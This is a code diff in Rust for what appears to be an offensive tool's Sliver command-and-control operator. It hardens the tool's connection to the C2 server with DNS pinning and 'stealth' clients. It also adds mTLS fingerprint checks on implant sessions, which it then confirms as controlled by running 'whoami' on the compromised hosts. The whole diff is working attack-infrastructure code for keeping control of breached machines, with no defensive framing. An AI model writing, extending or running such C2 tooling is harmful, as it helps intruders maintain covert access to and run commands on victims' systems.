@@ -4,7 +4,7 @@ use crate::core::c2::{C2Operator, C2Session, SessionState};
 use crate::utils::executor::{StealthExecutor, ExecutorMode};
 use async_trait::async_trait;
 use anyhow::{Result, Context};
-use tracing::info;
+use tracing::{info, warn};
 use std::sync::Arc;
 use serde_json::Value;
 
@@ -21,11 +21,16 @@ struct SliverGrpcClient {
 
 impl SliverGrpcClient {
     async fn new(proxy_manager: &crate::utils::proxy::ProxyManager, server_addr: &str) -> Result<Self> {
-        let (_, client) = if server_addr == "127.0.0.1" || server_addr == "localhost" {
-            proxy_manager.get_localhost_client(server_addr)?
-        } else {
-            proxy_manager.get_client_fail_closed(server_addr)?
-        };
+        // --- V14.2 HARDENING: DNS Resolve & Pinning ---
+        let addr = tokio::net::lookup_host(format!("{}:31337", server_addr)).await?
+            .next()
+            .ok_or_else(|| anyhow::anyhow!("C2 DNS resolution failed for {}", server_addr))?;
+            
+        let client = crate::utils::stealth_http::StealthClientBuilder::build_pinned_infra(
+            proxy_manager, 
+            server_addr, 
+            addr
+        )?;
         
         Ok(Self {
             client,
@@ -191,6 +196,20 @@ impl<M: ExecutorMode> C2Operator for SovereignSliverOperator<M> {
                     
                     let session_id = session.get("ID").and_then(|v| v.as_str()).unwrap_or("");
                     
+                    // --- V14.2 mTLS Fingerprint Verification ---
+                    if let Some(expected_fp) = target.tactical_context.get("c2_fingerprint").and_then(|v| v.as_str()) {
+                        let actual_fp = session.get("CertificateFingerprint").and_then(|v| v.as_str()).unwrap_or("");
+                        
+                        let op = crate::core::c2::typestate::SliverOperator::<crate::core::c2::typestate::Established>::new()
+                            .with_fingerprint(expected_fp.to_string());
+                        
+                        if op.promote(actual_fp).is_err() {
+                            warn!("❌ V14.2 SOVEREIGN: mTLS Fingerprint MISMATCH for {}. Session is NOT sovereign.", target.host);
+                            return Ok(SessionState::Established);
+                        }
+                        info!("✅ V14.2 SOVEREIGN: mTLS fingerprint verified for {}", target.host);
+                    }
+
                     // Verify session sovereignty with command execution
                     match client.execute_command(session_id, "whoami").await {
                         Ok(output) if !output.is_empty() => {
@@ -217,6 +236,7 @@ impl<M: ExecutorMode> C2Operator for SovereignSliverOperator<M> {
             target: s.get("RemoteAddress").and_then(|v| v.as_str()).unwrap_or("unknown").to_string(),
             state: SessionState::Established,
             last_checkin: chrono::Utc::now(),
+            fingerprint: s.get("CertificateFingerprint").and_then(|v| v.as_str()).map(|s| s.to_string()),
         }).collect())
     }
 }
